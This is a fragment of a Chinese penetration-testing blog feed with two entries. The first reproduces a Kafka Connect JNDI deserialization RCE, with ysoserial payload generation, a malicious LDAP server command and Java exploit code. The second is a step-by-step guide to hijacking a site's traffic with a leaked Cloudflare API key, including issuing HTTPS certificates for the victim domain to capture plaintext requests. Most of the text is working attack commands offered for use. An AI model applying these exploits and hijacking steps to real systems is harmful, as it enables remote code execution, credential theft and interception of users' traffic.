title="生成反序列化数据"></a>生成反序列化数据</h3><p><code>java -jar ysuserial-1.3-su18-all.jar -g CommonsBeanutils1183NOCC -p &#39;open -a Calculator.app&#39; |base64|pbcopy</code></p><h3 id="LDAP托管数据"><a href="#LDAP托管数据" class="headerlink" title="LDAP托管数据"></a>LDAP托管数据</h3><p>使用<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">恶意LDAP</a>修改上一步生成的数据，然后启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  <span class="token number">0.0</span>.0.0 <span class="token number">8088</span> <span class="token number">1389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行代码，然后计算器就弹出来了</p><h2 id="测试中的问题"><a href="#测试中的问题" class="headerlink" title="测试中的问题"></a>测试中的问题</h2><p>在反序列化的测试中，尝试了这几种jndi框架，只有第二种可以执行其中命令，但是还不够完美，最后还是用su18师傅的<a href="https://github.com/su18/ysoserial">su18/ysoserial</a>生成之后用ldap托管靠谱。</p><ul><li><a href="https://github.com/Bl0omZ/JNDIEXP">https://github.com/Bl0omZ/JNDIEXP</a></li><li><a href="https://github.com/nu1r/JNDIExploit">https://github.com/nu1r/JNDIExploit</a></li><li><a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></li></ul><p>考虑到一种黑盒的情形，假如在使用urldns发现存在cb链，攻击的时候可以用ysoserial生成不同的payload多尝试几次。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;影响版本：2.3.0 &amp;lt;= Apache Kafka Connect &amp;lt;= 3.3.2&lt;/li&gt;
&lt;li&gt;修复建议: 升级至3.4.0版本&lt;/li&gt;
&lt;li&gt;官方链接：&lt;a href=&quot;https://kafka.apache.org/cve-list&quot;&gt;https://kafka.apache.org/cve-list&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;本地先启动kafka server:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;wget&lt;/span&gt; https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz
&lt;span class=&quot;token function&quot;&gt;tar&lt;/span&gt; -xvf kafka_2.13-3.4.0.tgz
 
//启动zk和kafka
bin/zookeeper-server-start.sh config/zookeeper.properties
bin/kafka-server-start.sh config/server.properties
 
//创建一个测试topic
bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; --partitions &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; --topic &lt;span class=&quot;token builtin class-name&quot;&gt;test&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;测试代码&quot;&gt;&lt;a href=&quot;#测试代码&quot; class=&quot;headerlink&quot; title=&quot;测试代码&quot;&gt;&lt;/a&gt;测试代码&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;kafka&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;clients&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;KafkaProducer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;kafka&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;clients&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Producer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;org&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;apache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;kafka&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;clients&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ProducerRecord&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Properties&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
 
&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Main&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Properties&lt;/span&gt; props &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Properties&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sasl.mechanism&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;SCRAM-SHA-256&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;security.protocol&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;SASL_SSL&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sasl.jaas.config&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;com.sun.security.auth.module.JndiLoginModule &quot;&lt;/span&gt;
                    &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;required user.provider.url=\&quot;ldap://0.0.0.0:1389/Exploit\&quot; &quot;&lt;/span&gt;
                    &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot;&lt;/span&gt;
                    &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;group.provider.url=\&quot;xxx\&quot;;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;bootstrap.servers&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;0.0.0.0:9092&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;key.deserializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;value.deserializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;key.serializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.kafka.common.serialization.StringSerializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        props&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;value.serializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;org.apache.kafka.common.serialization.StringSerializer&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;Producer&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt; producer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;KafkaProducer&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;props&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ProducerRecord&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;hello&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;world&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;pom.xml文件：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-xml&quot; data-language=&quot;xml&quot;&gt;&lt;code class=&quot;language-xml&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependencies&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependency&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;groupId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;org.apache.kafka&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;groupId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;artifactId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;kafka-clients&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;artifactId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;3.3.0&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;dependency&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;dependency&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;groupId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;commons-beanutils&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;groupId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;artifactId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;commons-beanutils&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;artifactId&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
        &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;1.8.3&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;dependency&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;dependencies&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;生成反序列化数据&quot;&gt;&lt;a href=&quot;#生成反序列化数据&quot; class=&quot;headerlink&quot; title=&quot;生成反序列化数据&quot;&gt;&lt;/a&gt;生成反序列化数据&lt;/h3&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>利用OpenResty进行域名流量劫持</title>
    <link href="https://jkme.github.io/2023/02/13/cname-hijack-openresty.html"/>
    <id>https://jkme.github.io/2023/02/13/cname-hijack-openresty.html</id>
    <published>2023-02-12T16:00:00.000Z</published>
    <updated>2023-03-30T06:19:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>攻击者具有修改域名解析记录的权限（比如拥有CloudFlare的API Key），可以修改CNAME或者A记录，想通过修改域名解析记录的方式，获取目标网站的所有流量（包括但不限于POST明文请求）。可以利用OpenResty的Lua扩展功能，记录HTTP请求体和相应的Response。顺嘴提一句，在CloudFalre里面，一般的接口操作都可以用API Key完成，但是一旦涉及到证书的续订下载等操作，需要用CA Key。</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>首先可以通过API接口查看泄漏的key是否生效：</p><h4 id="查看Zones"><a href="#查看Zones" class="headerlink" title="查看Zones"></a>查看Zones</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看Zones对应的DNS记录"><a href="#查看Zones对应的DNS记录" class="headerlink" title="查看Zones对应的DNS记录"></a>查看Zones对应的DNS记录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_records<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看审计日志"><a href="#查看审计日志" class="headerlink" title="查看审计日志"></a>查看审计日志</h4><p>获取最近的登陆日志、操作日志、客户端IP等：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/accounts/<span class="token operator">&lt;</span>Account ID<span class="token operator">></span>/audit_logs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看最近的DNS请求数量"><a href="#查看最近的DNS请求数量" class="headerlink" title="查看最近的DNS请求数量"></a>查看最近的DNS请求数量</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>ZONE ID<span class="token operator">></span>/dns_analytics/report?dimensions<span class="token operator">=</span>responseCode,queryName<span class="token operator">&amp;</span><span class="token assign-left variable">metrics</span><span class="token operator">=</span>queryCount<span class="token operator">&amp;</span><span class="token assign-left variable">sort</span><span class="token operator">=</span>+responseCode,-queryName<span class="token operator">&amp;</span><span class="token assign-left variable">filters</span><span class="token operator">=</span>responseCode<span class="token operator">==</span>NOERROR<span class="token operator">&amp;</span><span class="token assign-left variable">since</span><span class="token operator">=</span><span class="token number">2023</span>-02-13T12:00:00Z<span class="token operator">&amp;</span><span class="token assign-left variable">until</span><span class="token operator">=</span><span class="token number">2023</span>-02-13T18:00:00Z<span class="token operator">&amp;</span><span class="token assign-left variable">limit</span><span class="token operator">=</span><span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="HTTPS证书"><a href="#HTTPS证书" class="headerlink" title="HTTPS证书"></a>HTTPS证书</h2><p>假如目标网站是https，但是又获取不到https的证书，可以选择使用acme.sh来重新生成另外一份HTTPS证书，因为已经有了DNS的解析权限，可以走DNS验证的方式来获取域名证书：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/root/.acme.sh/acme.sh --issue --dns -d <span class="token operator">&lt;</span>victim.com<span class="token operator">></span> -d <span class="token string">"*.&lt;victim.com>"</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please/root/.acme.sh/acme.sh --renew --dns -d <span class="token operator">&lt;</span>victim.com<span class="token operator">></span> -d <span class="token string">"*.&lt;victim.com>"</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一个条命令会生成两个TXT解析，利用已有的DNS权限创建对应的TXT解析记录，然后运行第二条命令，不出意外的话可以成功生成证书。这时可以删除这两条TXT记录，注意使用dns认证的方式生成证书不可以自动续订。<br>相关的CloudFlare接口：</p><h4 id="新增DNS-Record"><a href="#新增DNS-Record" class="headerlink" title="新增DNS Record"></a>新增DNS Record</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST https://api.cloudflare.com/client/v4/zones/<span class="token operator">&lt;</span>Zone ID<span class="token operator">></span>/dns_records<span class="token punctuation">&#123;</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"TXT"</span>, <span class="token string">"name"</span><span class="token 